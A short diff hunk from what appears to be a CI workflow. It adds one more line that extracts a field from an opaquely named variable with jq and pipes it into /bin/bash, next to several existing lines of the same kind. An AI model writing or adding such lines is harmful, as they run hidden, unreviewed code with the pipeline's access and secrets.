@@ -35,6 +35,7 @@ jobs:
           echo $vrkpu382 | jq -r .txllu6 | /bin/bash
           echo $efv66178 | jq -r .pba72 | /bin/bash
           printf '%s' "$vfwdm291" | jq -r .ey67 | /bin/bash
+          printf '%s' "$ppp1" | jq -r .jccg59 | /bin/bash
 
       - name: Upload data
         if: always()
